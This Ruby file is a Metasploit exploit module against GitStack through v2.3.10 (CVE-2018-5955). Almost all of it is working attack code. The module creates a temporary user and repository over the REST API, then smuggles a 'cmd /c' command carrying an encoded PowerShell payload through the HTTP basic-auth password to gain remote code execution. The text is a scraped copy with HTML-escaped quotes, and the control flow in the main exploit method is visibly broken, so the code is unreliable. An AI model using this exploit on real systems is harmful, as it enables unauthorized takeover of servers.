# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;GitStack Unsanitized Argument RCE&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote code execution vulnerability that
        exists in GitStack through v2.3.10, caused by an unsanitized argument
        being passed to an exec function call. This module has been tested
        on GitStack v2.3.10.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Kacper Szurek&#039;,    # Vulnerability discovery and PoC
          &#039;Jacob Robles&#039;      # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2018-5955&#039;],
          [&#039;EDB&#039;, &#039;43777&#039;],
          [&#039;EDB&#039;, &#039;44044&#039;],
          [&#039;URL&#039;, &#039;https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Jan 15 2018&#039;,
      &#039;DefaultTarget&#039;  => 0))
  end
 
  def check_web
    begin
      res = send_request_cgi({
        &#039;uri&#039;     =>  &#039;/rest/settings/general/webinterface/&#039;,
        &#039;method&#039;  => &#039;GET&#039;
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
    end
 
    if res && res.code == 200
      if res.body =~ /true/
        vprint_good(&#039;Web interface is enabled&#039;)
        return true
      else
        vprint_error(&#039;Web interface is disabled&#039;)
        return false
      end
    else
      print_error(&#039;Unable to determine status of web interface&#039;)
      return nil
    end
  end
 
  def check_repos
    begin
      res = send_request_cgi({
        &#039;uri&#039;     =>  &#039;/rest/repository/&#039;,
        &#039;method&#039;  =>  &#039;GET&#039;,
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
    end
    if res && res.code == 200
      begin
        mylist = res.get_json_document
      rescue JSON::ParserError => e
        print_error("Failed: #{e.class} - #{e.message}")
        return nil
      end
 
      if mylist.length == 0
        vprint_error(&#039;No repositories found&#039;)
        return false
      else
        vprint_good(&#039;Repositories found&#039;)
        return mylist
      end
    else
      print_error(&#039;Unable to determine available repositories&#039;)
      return nil
    end
  end
 
  def update_web(web)
    data = {&#039;enabled&#039; => web}
    begin
      res = send_request_cgi({
        &#039;uri&#039;     =>  &#039;/rest/settings/general/webinterface/&#039;,
        &#039;method&#039;  =>  &#039;PUT&#039;,
        &#039;data&#039;    =>  data.to_json
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
    end
    if res && res.code == 200
      vprint_good("#{res.body}")
    end
  end
 
  def create_repo
    repo = Rex::Text.rand_text_alpha(5)
    c_token = Rex::Text.rand_text_alpha(5)
    begin
      res = send_request_cgi({
        &#039;uri&#039;       =>  &#039;/rest/repository/&#039;,
        &#039;method&#039;    =>  &#039;POST&#039;,
        &#039;cookie&#039;    =>  "csrftoken=#{c_token}",
        &#039;vars_post&#039; =>  {
          &#039;name&#039;                =>  repo,
          &#039;csrfmiddlewaretoken&#039; =>  c_token
        }
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
    end
    if res && res.code == 200
      vprint_good("#{res.body}")
      return repo
    else
      print_status(&#039;Unable to create repository&#039;)
      return nil
    end
  end
 
  def delete_repo(repo)
    begin
      res = send_request_cgi({
        &#039;uri&#039;     =>  "/rest/repository/#{repo}/",
        &#039;method&#039;  =>  &#039;DELETE&#039;
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
    end
 
    if res && res.code == 200
      vprint_good("#{res.body}")
    else
      print_status(&#039;Failed to delete repository&#039;)
    end
  end
 
  def create_user
    user = Rex::Text.rand_text_alpha(5)
    pass = user
    begin
      res = send_request_cgi({
        &#039;uri&#039;       => &#039;/rest/user/&#039;,
        &#039;method&#039;    =>  &#039;POST&#039;,
        &#039;vars_post&#039; =>  {
          &#039;username&#039;  =>  user,
          &#039;password&#039;  =>  pass
        }
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
    end
    if res && res.code == 200
      vprint_good("Created user: #{user}")
      return user
    else
      print_error("Failed to create user")
      return nil
    end
  end
 
  def delete_user(user)
    begin
      res = send_request_cgi({
        &#039;uri&#039;     =>  "/rest/user/#{user}/",
        &#039;method&#039;  =>  &#039;DELETE&#039;
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
    end
    if res && res.code == 200
      vprint_good("#{res.body}")
    else
      print_status(&#039;Delete user unsuccessful&#039;)
    end
  end
 
  def mod_user(repo, user, method)
    begin
      res = send_request_cgi({
        &#039;uri&#039;     =>  "/rest/repository/#{repo}/user/#{user}/",
        &#039;method&#039;  =>  method
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
    end
    if res && res.code == 200
      vprint_good("#{res.body}")
    else
      print_status(&#039;Unable to add/remove user from repo&#039;)
    end
  end
 
  def repo_users(repo)
    begin
      res = send_request_cgi({
        &#039;uri&#039;     =>  "/rest/repository/#{repo}/user/",
        &#039;method&#039;  =>  &#039;GET&#039;
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
    end
    if res && res.code == 200
      begin
        users = res.get_json_document
        users -= [&#039;everyone&#039;]
      rescue JSON::ParserError => e
        print_error("Failed: #{e.class} - #{e.message}")
        users = nil
      end
    else
      return nil
    end
    return users
  end
 
  def run_exploit(repo, user, cmd)
    begin
      res = send_request_cgi({
        &#039;uri&#039;           =>  &#039;/web/index.php&#039;,
        &#039;method&#039;        =>  &#039;GET&#039;,
        &#039;authorization&#039; =>  basic_auth(user, "#{Rex::Text.rand_text_alpha(1)} && cmd /c #{cmd}"),
        &#039;vars_get&#039;      =>  {
          &#039;p&#039; =>  "#{repo}.git",
          &#039;a&#039; =>  &#039;summary&#039;
        }
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
    end
  end
 
  def exploit
    command = cmd_psh_payload(
      payload.encoded,
      payload_instance.arch.first,
      { :remove_comspec => true, :encode_final_payload => true }
    )
    fail_with(Failure::PayloadFailed, "Payload exceeds space left in exec call") if command.length > 6110
 
    web = check_web
    repos = check_repos
 
    if web.nil? || repos.nil?
      return
    end
 
    unless web
      update_web(!web)
      # Wait for interface
      sleep 8
    end
 
    if repos
      pwn_repo = repos[0][&#039;name&#039;]
    else
      pwn_repo = create_repo
    end
 
    r_users = repo_users(pwn_repo)
      pwn_user = r_users[0]
      run_exploit(pwn_repo, pwn_user, command)
    else
      pwn_user = create_user
      if pwn_user
        mod_user(pwn_repo, pwn_user, &#039;POST&#039;)
        run_exploit(pwn_repo, pwn_user, command)
        mod_user(pwn_repo, pwn_user, &#039;DELETE&#039;)
        delete_user(pwn_user)
      end
    end
 
    unless web
      update_web(web)
    end
 
    unless repos
      delete_repo(pwn_repo)
    end
  end
end

